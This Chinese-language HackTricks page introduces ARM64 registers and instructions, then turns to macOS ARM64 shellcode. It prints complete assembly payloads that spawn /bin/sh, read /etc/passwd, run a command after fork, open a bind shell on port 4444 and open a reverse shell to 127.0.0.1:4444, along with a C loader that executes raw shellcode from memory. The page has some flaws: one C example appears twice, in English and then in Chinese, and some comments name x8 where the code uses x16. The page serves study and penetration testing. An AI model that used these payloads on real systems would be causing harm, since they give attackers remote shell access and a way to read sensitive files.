# ARM64简介

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## **ARM64简介**

ARM64，也被称为ARMv8-A，是一种64位处理器架构，用于各种设备，包括智能手机、平板电脑、服务器，甚至一些高端个人电脑（macOS）。它是ARM Holdings公司的产品，该公司以其节能的处理器设计而闻名。

### **寄存器**

ARM64有**31个通用寄存器**，标记为`x0`到`x30`。每个寄存器可以存储一个**64位**（8字节）的值。对于只需要32位值的操作，可以使用名为w0到w30的32位模式访问相同的寄存器。

1. **`x0`**到**`x7`** - 通常用作临时寄存器和传递子程序参数。
* **`x0`**还携带函数的返回数据
2. **`x8`** - 在Linux内核中，`x8`用作`svc`指令的系统调用号。**在macOS中，使用的是x16！**
3. **`x9`**到**`x15`** - 更多的临时寄存器，通常用于局部变量。
4. **`x16`**和**`x17`** - 临时寄存器，也用于间接函数调用和PLT（Procedure Linkage Table）存根。
* **`x16`**用作**`svc`**指令的**系统调用号**。
5. **`x18`** - 平台寄存器。在某些平台上，该寄存器保留用于特定平台的用途。
6. **`x19`**到**`x28`** - 这些是被调用者保存的寄存器。函数必须保留这些寄存器的值供其调用者使用。
7. **`x29`** - **帧指针**。
8. **`x30`** - 链接寄存器。当执行`BL`（带链接的分支）或`BLR`（带链接到寄存器的分支）指令时，它保存返回地址。
9. **`sp`** - **堆栈指针**，用于跟踪堆栈的顶部。
10. **`pc`** - **程序计数器**，指向将要执行的下一条指令。

### **调用约定**

ARM64调用约定规定，函数的**前八个参数**通过寄存器**`x0`到`x7`**传递。**额外的**参数通过**堆栈**传递。**返回**值通过寄存器**`x0`**传回，如果是**128位**的话，也可以通过**`x1`**传回。函数调用时，**`x19`**到**`x30`**和**`sp`**寄存器必须被**保留**。

在汇编中阅读函数时，要查找**函数的序言和尾声**。**序言**通常涉及**保存帧指针（`x29`）**，**设置新的帧指针**和**分配堆栈空间**。**尾声**通常涉及**恢复保存的帧指针**和**从函数返回**。

### **常见指令**

ARM64指令通常具有**`opcode dst, src1, src2`**的格式，其中**`opcode`**是要执行的**操作**（如`add`、`sub`、`mov`等），**`dst`**是结果将被存储的**目标**寄存器，**`src1`**和**`src2`**是**源**寄存器。也可以使用立即值代替源寄存器。

* **`mov`**：将一个值从一个**寄存器**移动到另一个寄存器。
* 示例：`mov x0, x1` - 这将将`x1`中的值移动到`x0`中。
* **`ldr`**：将一个值从**内存**加载到**寄存器**中。
* 示例：`ldr x0, [x1]` - 这将从由`x1`指向的内存位置加载一个值到`x0`中。
* **`str`**：将一个值从寄存器存储到内存中。
* 示例：`str x0, [x1]` - 这将将`x0`中的值存储到由`x1`指向的内存位置中。
* **`ldp`**：**加载一对寄存器**。该指令从**连续的内存**位置加载两个寄存器。内存地址通常是通过将另一个寄存器中的值与偏移量相加形成的。
* 示例：`ldp x0, x1, [x2]` - 这将从`x2`和`x2 + 8`处的内存位置分别加载`x0`和`x1`。
* **`stp`**：**存储一对寄存器**。该指令将两个寄存器存储到**连续的内存**位置。内存地址通常是通过将另一个寄存器中的值与偏移量相加形成的。
* 示例：`stp x0, x1, [x2]` - 这将`x0`和`x1`存储到`x2`和`x2 + 8`处的内存位置。
* **`add`**：将两个寄存器的值相加，并将结果存储在一个寄存器中。
* 示例：`add x0, x1, x2` - 这将将`x1`和`x2`中的值相加，并将结果存储在`x0`中。
* **`sub`**：将两个寄存器的值相减，并将结果存储在一个寄存器中。
* 示例：`sub x0, x1, x2` - 这将从`x1`中减去`x2`的值，并将结果存储在`x0`中。
* **`mul`**: **乘法**，将两个寄存器的值相乘，并将结果存储在一个寄存器中。
* 示例：`mul x0, x1, x2` — 将`x1`和`x2`的值相乘，并将结果存储在`x0`中。
* **`div`**: **除法**，将一个寄存器的值除以另一个寄存器的值，并将结果存储在一个寄存器中。
* 示例：`div x0, x1, x2` — 将`x1`的值除以`x2`的值，并将结果存储在`x0`中。
* **`bl`**: **带链接分支**，用于调用一个**子程序**。将**返回地址存储在`x30`中**。
* 示例：`bl myFunction` — 调用函数`myFunction`，并将返回地址存储在`x30`中。
* **`blr`**: **带链接寄存器分支**，用于调用一个**子程序**，其中目标在一个**寄存器**中指定。将**返回地址存储在`x30`中**。
* 示例：`blr x1` — 调用地址包含在`x1`中的函数，并将返回地址存储在`x30`中。
* **`ret`**: **从子程序返回**，通常使用**`x30`中的地址**。
* 示例：`ret` — 使用`x30`中的返回地址从当前子程序返回。
* **`cmp`**: **比较**两个寄存器的值，并设置条件标志。
* 示例：`cmp x0, x1` — 比较`x0`和`x1`的值，并相应地设置条件标志。
* **`b.eq`**: **等于时分支**，基于前面的`cmp`指令。
* 示例：`b.eq label` — 如果前面的`cmp`指令发现两个相等的值，则跳转到`label`。
* **`b.ne`**: **不等于时分支**。此指令检查条件标志（由前一个比较指令设置），如果比较的值不相等，则跳转到一个标签或地址。
* 示例：在`cmp x0, x1`指令之后，`b.ne label` — 如果`x0`和`x1`的值不相等，则跳转到`label`。
* **`cbz`**: **零时比较和分支**。此指令将一个寄存器与零进行比较，如果它们相等，则跳转到一个标签或地址。
* 示例：`cbz x0, label` — 如果`x0`中的值为零，则跳转到`label`。
* **`cbnz`**: **非零时比较和分支**。此指令将一个寄存器与零进行比较，如果它们不相等，则跳转到一个标签或地址。
* 示例：`cbnz x0, label` — 如果`x0`中的值非零，则跳转到`label`。
* **`adrp`**: 计算一个符号的**页地址**并将其存储在一个寄存器中。
* 示例：`adrp x0, symbol` — 计算`symbol`的页地址并将其存储在`x0`中。
* **`ldrsw`**: 从内存中**加载**一个**有符号的32位**值，并将其**符号扩展为64位**。
* 示例：`ldrsw x0, [x1]` — 从由`x1`指向的内存位置加载一个有符号的32位值，将其符号扩展为64位，并将其存储在`x0`中。
* **`stur`**: 将一个寄存器的值**存储到内存位置**，使用另一个寄存器的偏移量。
* 示例：`stur x0, [x1, #4]` — 将`x0`中的值存储到当前`x1`地址加4字节的内存位置。
* &#x20;**`svc`** : 进行**系统调用**。它代表"Supervisor Call"。当处理器执行此指令时，它会从用户模式切换到内核模式，并跳转到内存中内核系统调用处理代码所在的特定位置。
* 示例：&#x20;

```armasm
mov x8, 93  ; 将退出系统调用的系统调用号（93）加载到寄存器x8中。
mov x0, 0   ; 将退出状态码（0）加载到寄存器x0中。
svc 0       ; 进行系统调用。
```

### **函数序言**

1.  **将链接寄存器和帧指针保存到堆栈中**：

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; 将x29和x30寄存器对存储到堆栈中，并减小堆栈指针
```
{% endcode %}
2. **设置新的帧指针**：`mov x29, sp`（为当前函数设置新的帧指针）
3. **为局部变量在堆栈上分配空间**（如果需要）：`sub sp, sp, <size>`（其中`<size>`是所需的字节数）

### **函数收尾**

1. **释放局部变量（如果有分配的变量）**：`add sp, sp, <size>`
2.  **恢复链接寄存器和帧指针**：

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; 从堆栈中加载x29和x30寄存器对，并增加堆栈指针
```
{% endcode %}
3. **返回**：`ret`（使用链接寄存器中的地址将控制返回给调用者）

## macOS

### syscalls

请查看[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)。

### Shellcodes

编译：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
提取字节的方法如下：

```assembly
ldr x0, =0x12345678
ldrb w1, [x0]
```

这段代码用于从内存地址0x12345678中提取一个字节。
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>用于测试shellcode的C代码</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

从[**这里**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)获取并解释。

{% tabs %}
{% tab title="使用adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="使用堆栈" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### 使用cat命令读取

目标是执行`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数（x1）是一个参数数组（在内存中表示为地址的堆栈）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### 使用fork从sh调用命令，以便主进程不被终止

Sometimes, when executing a command using the `system()` function in C, the main process may be terminated if the command encounters an error. To avoid this, you can use the `fork()` system call to create a child process and then execute the command using `sh` in the child process. This way, even if the command fails, the main process will not be terminated.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

int main() {
    pid_t pid = fork();

    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    } else if (pid == 0) {
        // Child process
        execl("/bin/sh", "sh", "-c", "your_command_here", (char *)NULL);
        exit(EXIT_SUCCESS);
    } else {
        // Parent process
        wait(NULL);
        printf("Command executed successfully!\n");
    }

    return 0;
}
```

在C语言中，有时候使用`system()`函数执行命令时，如果命令遇到错误，主进程可能会被终止。为了避免这种情况，可以使用`fork()`系统调用创建一个子进程，然后在子进程中使用`sh`执行命令。这样，即使命令失败，主进程也不会被终止。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

int main() {
    pid_t pid = fork();

    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    } else if (pid == 0) {
        // 子进程
        execl("/bin/sh", "sh", "-c", "your_command_here", (char *)NULL);
        exit(EXIT_SUCCESS);
    } else {
        // 父进程
        wait(NULL);
        printf("命令执行成功！\n");
    }

    return 0;
}
```
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### 绑定 shell

从 [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) 获取绑定 shell，端口为 **4444**。
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### 反向 shell

从 [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s)，反向 shell 到 **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
